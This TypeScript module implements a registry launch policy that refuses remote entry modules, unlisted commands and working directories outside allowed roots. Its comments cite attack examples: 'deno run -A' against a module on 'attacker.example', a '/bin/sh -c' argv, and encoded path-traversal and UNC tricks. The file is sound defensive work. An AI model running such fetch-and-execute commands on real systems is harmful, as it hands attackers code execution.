// Copyright (c) 2026 the Zuke contributors
// SPDX-License-Identifier: MIT

/**
 * The policy that decides whether a {@link BuildLocation} read out of a build
 * registry may be spawned.
 *
 * {@link "../mcp/registry_server.ts".RegistryMcpServer} runs what the registry
 * tells it to run. That is fine when the registry is the local
 * `<root>/.zuke/builds` directory `zuke register` writes, and it is a remote
 * code-execution primitive when the registry is an HTTP service, a shared
 * directory, or anything else a second party can write to: a descriptor whose
 * module is `https://attacker.example/x.ts` becomes `deno run -A` against
 * attacker-controlled source, with every permission, in the operator's
 * workspace.
 *
 * So a **remote** entry module is refused unless the operator names its host in
 * {@link LAUNCH_HOSTS_ENV}. That includes a module on another machine spelled
 * as a path: a UNC path (`\\host\share\x.ts`, `//host/x.ts`) or a `file:`
 * URL with a host, which Windows opens over SMB.
 *
 * A local module — a bare path, a Windows drive path, or a `file:` URL, which
 * is what {@link Deno.mainModule} yields and therefore what `zuke register`
 * writes — is not "already code on the machine" just because it is local: on a
 * shared host the registry writer can put a file in `/tmp` or their own home
 * and name it. So a module launch is **confined by location**: the entry
 * module (symlinks resolved) and the working directory must both lie inside a
 * directory listed in {@link LAUNCH_DIRS_ENV}, which defaults to the project
 * root of the server itself. The working directory is confined for a remote
 * module too, since the writer chooses it either way.
 *
 * A `command` location is refused unless the operator names its program in
 * {@link LAUNCH_COMMANDS_ENV}. The argv of a command descriptor is not "code
 * already on the machine" the way a local module path is: the registry writer
 * chooses the program *and its arguments*, so `["deno", "run", "-A",
 * "https://attacker.example/x.ts"]` is the refused module case spelled as a
 * command, and `["/bin/sh", "-c", …]` is arbitrary code with no fetch at all.
 * Naming a program is the operator's statement that this registry may pass it
 * arguments. Its working directory is confined to {@link LAUNCH_DIRS_ENV} like
 * a module's: an allowed program run from a writer-chosen directory still
 * picks up that directory's `deno.json`, `package.json` or `Makefile`.
 *
 * @module
 */

import { findConfigDir, pathExists } from "../config.ts";
import { ALLOW_INSECURE_ENV, isLoopbackHost } from "../http.ts";
import { isAbsolutePath } from "../internal.ts";
import { absolutePath } from "../path.ts";
import type { BuildLocation } from "./descriptor.ts";

/**
 * The environment variable listing the hosts a remote entry module may be
 * fetched from — comma- or space-separated (`ZUKE_REGISTRY_LAUNCH_HOSTS=
 * "builds.example.com, jsr:"`). A lone `*` allows any, for an operator who has
 * decided the registry itself is trusted.
 *
 * An entry is matched against the module's **launch origin**: the hostname for
 * a URL that has one, and the scheme otherwise (`jsr:`, `npm:`, `data:`) — so a
 * specifier that carries no hostname can be named too, rather than being one an
 * operator has no way to allow.
 */
export const LAUNCH_HOSTS_ENV = "ZUKE_REGISTRY_LAUNCH_HOSTS";

/**
 * The environment variable listing the programs a `command` location may spawn
 * — comma-separated (`ZUKE_REGISTRY_LAUNCH_COMMANDS="make,
 * /usr/local/bin/deploy.sh"`), with newlines accepted too. Commas rather than
 * whitespace, because a program path may contain a space. A lone `*` allows
 * any, for an operator who has decided the registry itself is trusted. Unset
 * (the default) refuses every command location.
 *
 * An entry must match the descriptor's `command[0]` **exactly** (case-folded,
 * since Windows program names are). It is deliberately not matched by basename:
 * the descriptor chooses the program string, so admitting `/tmp/anywhere/make`
 * because an operator wrote `make` would let a registry writer point a trusted
 * name at a file of their own. `make` therefore admits the bare name only — the
 * one the operating system resolves on `PATH` — and `/usr/bin/make` admits that
 * path only. A refusal names the exact string to add, so the list is built from
 * what a run actually asks for rather than from guesswork.
 *
 * Listing a program does not license it to fetch: every argument that names a
 * remote specifier still has to pass {@link LAUNCH_HOSTS_ENV}, so
 * `deno run -A https://…` is refused by origin exactly as the module form is.
 *
 * What that leaves is inherent to allow-listing: an approved program can be
 * given ordinary local arguments the registry writer chose. A **relative**
 * program is resolved against the descriptor's own working directory, which
 * the same writer picks, so prefer an absolute path; and listing a shell or
 * interpreter hands over anything reachable locally, since `sh -c` needs no
 * fetch at all. The list is where the operator makes that judgement, which is
 * why the default is to name nothing.
 */
export const LAUNCH_COMMANDS_ENV = "ZUKE_REGISTRY_LAUNCH_COMMANDS";

/**
 * The environment variable listing the directories a registered build may be
 * launched from — comma-separated (`ZUKE_REGISTRY_LAUNCH_DIRS="/srv/builds,
 * /home/ci/repo"`), with newlines accepted too, since a path may contain a
 * space. Each entry must be absolute; a relative one matches nothing. A lone
 * `*` turns the confinement off, for an operator who has decided the registry
 * itself is trusted.
 *
 * Unset, it is the project root of the server — the nearest directory holding
 * `zuke.json` above its working directory, else that directory — which is
 * where `zuke register` run in the same checkout puts both the module and the
 * working directory.
 *
 * The working directory of either location kind, and a local entry module,
 * must each lie inside a listed
 * directory, compared segment by segment after every symlink is resolved, so
 * `/repo-evil` is not inside `/repo` and a link under `/repo` pointing at
 * `/tmp` does not carry `/tmp` inside. The listed directories themselves must
 * not be writable by anyone the operator does not trust to run code as them.
 */
export const LAUNCH_DIRS_ENV = "ZUKE_REGISTRY_LAUNCH_DIRS";

/**
 * The filesystem facts the location confinement needs, injected so
 * {@link launchDenial} stays a pure function of its inputs.
 */
export interface LaunchFileSystem {
  /** The directory launches are confined to when {@link LAUNCH_DIRS_ENV} is unset. */
  defaultDir: string;
  /**
   * The canonical form of an absolute path, every symlink resolved — or
   * `undefined` when it cannot be resolved, which refuses the launch.
   */
  realPath(path: string): string | undefined;
}

/** Why a launch location was refused: a stable reason plus a human explanation. */
export interface LaunchDenial {
  /** The stable, machine-readable reason (audited, and returned to the client). */
  reason: string;
  /** The operator-facing explanation naming what to change. */
  detail: string;
}

/** What a module specifier names: a local path, or a remote origin to allow. */
type ModuleTarget =
  | { path: string }
  | { origin: string; url: URL | null };

/**
 * Classify a module specifier. Anything `URL` cannot parse (`./zuke.ts`,
 * `/srv/build/zuke.ts`) is a path, as is a Windows drive path —
 * `new URL("C:\\src\\zuke.ts")` parses with a single-letter "scheme", which is
 * a drive letter, not a scheme — and a `file:` URL with no host (or
 * `localhost`). A `file:` URL naming another host is remote, and so is any path
 * that opens with two or more separators — `\\host\share`, `//host/share`,
 * or a `file:` URL whose decoded path does (`file:///%2F%2Fhost/share`):
 * Windows reads each as a UNC path and fetches it over SMB. The origin of such
 * a path is its first segment.
 */
function classifyModule(raw: string): ModuleTarget {
  let url: URL | null = null;
  try {
    url = new URL(raw);
  } catch {
    // Not a URL: a filesystem path.
  }
  let path = raw;
  if (url !== null && !isDrivePath(url, raw)) {
    if (
      url.protocol !== "file:" ||
      (url.hostname !== "" && url.hostname !== "localhost")
    ) {
      return { origin: launchOrigin(url), url };
    }
    path = filePath(url);
  }
  const unc = /^[\\/]{2,}([^\\/]*)/.exec(path);
  return unc === null ? { path } : { origin: unc[1], url: null };
}

/** Whether `url` is a Windows drive path (`C:\\x`) that `URL` parsed as a scheme. */
function isDrivePath(url: URL, raw: string): boolean {
  return /^[a-zA-Z]:$/.test(url.protocol) && /^[a-zA-Z]:[\\/]/.test(raw);
}

/**
 * The filesystem path a host-less `file:` URL names: its decoded pathname,
 * minus the leading slash before a drive letter (`file:///C:/x` is `C:/x`).
 *
 * A pathname that is not valid UTF-8 once decoded still opens — Deno decodes
 * it byte by byte — so its ASCII escapes are decoded regardless: `%2F` and
 * `%2E` are what shape the path, and leaving them encoded would let
 * `..%2F..%2Ftmp%E0` pass as one harmless segment under the allowed root.
 */
function filePath(url: URL): string {
  let path: string;
  try {
    path = decodeURIComponent(url.pathname);
  } catch {
    path = url.pathname.replace(
      /%([0-7][0-9a-fA-F])/g,
      (_, hex: string) => String.fromCharCode(parseInt(hex, 16)),
    );
  }
  return /^\/[a-zA-Z]:/.test(path) ? path.slice(1) : path;
}

/**
 * The token a remote module is allowed by: its hostname when it has one, else
 * its scheme (`jsr:`, `npm:`, `data:`).
 */
function launchOrigin(url: URL): string {
  return url.hostname !== "" ? url.hostname : url.protocol;
}

/**
 * Split an allow-list environment variable into its entries on `separator`,
 * trimming each and dropping empties. Shared by the module-origin and
 * command-program gates so one implementation decides what an entry is, and
 * both lists trim, case-fold and honour `*` alike.
 *
 * The separator differs because the entries do. A hostname cannot contain a
 * space, so the origin list accepts either a comma or whitespace; a program
 * path routinely does — `C:\Program Files\...` — so the command list separates
 * on commas and newlines only, and would otherwise be unable to name it.
 */
function allowList(
  name: string,
  readEnv: (name: string) => string | undefined,
  separator: RegExp,
): string[] {
  return listEntries(name, readEnv, separator).map((entry) =>
    entry.toLowerCase()
  );
}

/**
 * The trimmed, non-empty entries of an environment variable split on
 * `separator`, case preserved — {@link allowList} folds case on top, which a
 * hostname or a program name wants and a POSIX directory must not have.
 */
function listEntries(
  name: string,
  readEnv: (name: string) => string | undefined,
  separator: RegExp,
): string[] {
  const raw = readEnv(name) ?? "";
  return raw.split(separator).map((entry) => entry.trim()).filter(
    (entry) => entry !== "",
  );
}

/** Entry separator for {@link LAUNCH_HOSTS_ENV}: a comma or any whitespace. */
const HOST_SEPARATOR = /[,\s]+/;

/**
 * Entry separator for {@link LAUNCH_COMMANDS_ENV} and {@link LAUNCH_DIRS_ENV}:
 * a comma or a newline, so a path containing a space can still be named.
 */
const PATH_SEPARATOR = /[,\n\r]+/;

/**
 * Decide whether `location` may be spawned, returning `null` when it may and a
 * {@link LaunchDenial} when it may not.
 *
 * A `command` location must name a program the operator listed in
 * {@link LAUNCH_COMMANDS_ENV}; an empty command is left to the caller, which
 * reports a build with nothing to launch rather than spawning anything. A
 * `module` location must name an allowed origin when remote. Either kind's
 * working directory — and, for a local module, the module itself — must lie
 * inside {@link LAUNCH_DIRS_ENV}, resolved through `fs`.
 */
export function launchDenial(
  location: BuildLocation,
  readEnv: (name: string) => string | undefined,
  fs: LaunchFileSystem,
): LaunchDenial | null {
  const target = location.kind === "module"
    ? classifyModule(location.module)
    : undefined;
  const denial = location.kind === "command"
    ? commandDenial(location.command, readEnv)
    : target !== undefined && "origin" in target
    ? originDenial(target, "entry module", readEnv)
    : null;
  if (denial !== null) return denial;
  const dirs = listEntries(LAUNCH_DIRS_ENV, readEnv, PATH_SEPARATOR);
  if (dirs.includes("*")) return null;
  const roots = (dirs.length > 0 ? dirs : [fs.defaultDir])
    .filter((dir) => isAbsolutePath(dir.replace(/\\/g, "/")))
    .map((dir) => fs.realPath(dir))
    .filter((dir) => dir !== undefined);
  // Checked as the spawn sees them: the server runs in the lexically normal
  // working directory, and Deno normalises a module path or `file:` URL the
  // same way before opening it, so `..` here is resolved before symlinks are.
  const slashed = location.cwd.replace(/\\/g, "/");
  if (!isAbsolutePath(slashed)) {
    return dirDenial("working directory", location.cwd);
  }
  const cwd = absolutePath(slashed);
  const confined: [string, string][] = [["working directory", cwd.path]];
  if (target !== undefined && "path" in target) {
    const module = target.path.replace(/\\/g, "/");
    confined.push([
      "entry module",
      isAbsolutePath(module) ? absolutePath(module).path : cwd(module).path,
    ]);
  }
  for (const [what, path] of confined) {
    const real = fs.realPath(path);
    if (real === undefined || !roots.some((root) => isInside(real, root))) {
      return dirDenial(what, real ?? path);
    }
  }
  return null;
}

/** The refusal for a launch whose `what` lies at `path`, outside every allowed directory. */
function dirDenial(what: string, path: string): LaunchDenial {
  return {
    reason: "launch_dir_not_allowed",
    detail: `Refusing to launch with the ${what} at "${path}": it is outside ` +
      `every directory a registered build may run from, so a registry entry ` +
      `could point it at a file anyone with a foothold on this machine ` +
      `wrote. Add the directory to ${LAUNCH_DIRS_ENV} (absolute, ` +
      `comma-separated; "*" allows any) if that registry is trusted to run ` +
      `code from it.`,
  };
}

/**
 * Whether the canonical path `path` is `root` or lies beneath it, compared by
 * whole segments (`/repo-evil` is not inside `/repo`) and case-folded for a
 * Windows drive path, whose filesystem is case-insensitive.
 */
function isInside(path: string, root: string): boolean {
  const fold = (value: string): string => {
    const normal = absolutePath(value).path;
    return /^[a-zA-Z]:/.test(normal) ? normal.toLowerCase() : normal;
  };
  const child = fold(path);
  const parent = fold(root);
  return child === parent ||
    child.startsWith(parent.endsWith("/") ? parent : `${parent}/`);
}

/**
 * The real {@link LaunchFileSystem}: Deno resolves symlinks, and the default
 * directory is the server's project root — the nearest `zuke.json` above its
 * working directory, else that directory, as the default registry is.
 */
export function hostLaunchFileSystem(): LaunchFileSystem {
  const cwd = Deno.cwd();
  return { defaultDir: findConfigDir(cwd, pathExists) ?? cwd, realPath };
}

/**
 * Resolve every symlink in the absolute `path`. A path that does not exist yet
 * resolves its nearest existing ancestor and keeps the missing tail, which
 * cannot be a symlink. A dangling symlink, and any other failure (a permission
 * error, a file used as a directory), is `undefined`, refusing the launch
 * rather than guessing.
 */
function realPath(path: string): string | undefined {
  try {
    return Deno.realPathSync(path);
  } catch (error) {
    if (!(error instanceof Deno.errors.NotFound)) return undefined;
  }
  // A dangling symlink is not a missing tail: its target can appear later,
  // anywhere, after this check has passed.
  if (pathExists(path)) return undefined;
  const cut = Math.max(path.lastIndexOf("/"), path.lastIndexOf("\\"));
  // Keep a root's separator: `C:` alone means the drive's working directory.
  const parent = /^([a-zA-Z]:)?$/.test(path.slice(0, cut))
    ? path.slice(0, cut + 1)
    : path.slice(0, cut);
  // A missing root (an absent drive) leaves nothing to resolve.
  if (parent === path) return undefined;
  const resolved = realPath(parent);
  return resolved === undefined
    ? undefined
    : `${resolved.replace(/[\\/]$/, "")}/${path.slice(cut + 1)}`;
}

/**
 * Decide whether a remote specifier may be fetched and run: its origin must be
 * allow-listed, and a plaintext origin needs the insecure opt-out on top.
 * Returns `null` for a local path, whose location is {@link launchDenial}'s
 * confinement to judge.
 *
 * One implementation, two callers. A module location is one specifier, and a
 * command location can carry one among its arguments — `deno run -A <url>` is
 * the same fetch-and-execute written a different way — so both are judged by
 * the same rule rather than by two that could drift apart.
 */
function remoteSpecifierDenial(
  raw: string,
  what: string,
  readEnv: (name: string) => string | undefined,
): LaunchDenial | null {
  const target = classifyModule(raw);
  return "origin" in target ? originDenial(target, what, readEnv) : null;
}

/**
 * Decide whether a remote origin may be fetched from: it must be allow-listed,
 * and a plaintext `http:` URL needs the insecure opt-out on top.
 */
function originDenial(
  { origin, url }: { origin: string; url: URL | null },
  what: string,
  readEnv: (name: string) => string | undefined,
): LaunchDenial | null {
  const allowed = allowList(LAUNCH_HOSTS_ENV, readEnv, HOST_SEPARATOR);
  if (!allowed.includes("*") && !allowed.includes(origin.toLowerCase())) {
    return {
      reason: "launch_origin_not_allowed",
      detail:
        `Refusing to spawn a remote ${what} from "${origin}": running it ` +
        `would execute code this machine fetches from the network on a ` +
        `registry's say-so. Add the origin to ${LAUNCH_HOSTS_ENV} (or "*" to ` +
        `allow any) if that registry is trusted to name it.`,
    };
  }
  if (
    url !== null && url.protocol === "http:" && !isLoopbackHost(url.hostname)
  ) {
    const optOut = readEnv(ALLOW_INSECURE_ENV);
    if (optOut === undefined || optOut === "") {
      return {
        reason: "insecure_launch_url",
        detail: `Refusing to spawn a plaintext ${what} from "${origin}": ` +
          `anyone on the path chooses the source that gets executed. Use an ` +
          `https URL, or set ${ALLOW_INSECURE_ENV}=1 to accept the risk.`,
      };
    }
  }
  return null;
}

/**
 * Decide whether a `command` location's argv may be spawned. An empty command
 * is not this gate's to refuse: the caller reports it as a build with no
 * runnable launch command, which is a clearer answer than a policy denial.
 */
function commandDenial(
  command: readonly string[],
  readEnv: (name: string) => string | undefined,
): LaunchDenial | null {
  const program = command[0];
  if (program === undefined || program === "") return null;
  const allowed = allowList(LAUNCH_COMMANDS_ENV, readEnv, PATH_SEPARATOR);
  if (allowed.includes("*") || allowed.includes(program.toLowerCase())) {
    // Allowing a program does not allow it to fetch. `deno run -A <url>` is the
    // refused remote-module case written as a command, so every argument that
    // names a remote specifier faces the same origin rule the module form does.
    // What remains after this — an approved program given ordinary local
    // arguments — is what allow-listing a program means, and the operator
    // decides it by choosing what to list.
    for (const argument of command.slice(1)) {
      const denial = remoteSpecifierDenial(argument, "argument", readEnv);
      if (denial !== null) return denial;
    }
    return null;
  }
  return {
    reason: "launch_command_not_allowed",
    detail:
      `Refusing to spawn "${program}": a command location lets whoever wrote ` +
      `the registry entry choose both the program and its arguments, which is ` +
      `code execution on this machine on a registry's say-so. Add the program ` +
      `to ${LAUNCH_COMMANDS_ENV} (or "*" to allow any) if that registry is ` +
      `trusted to name it.`,
  };
}
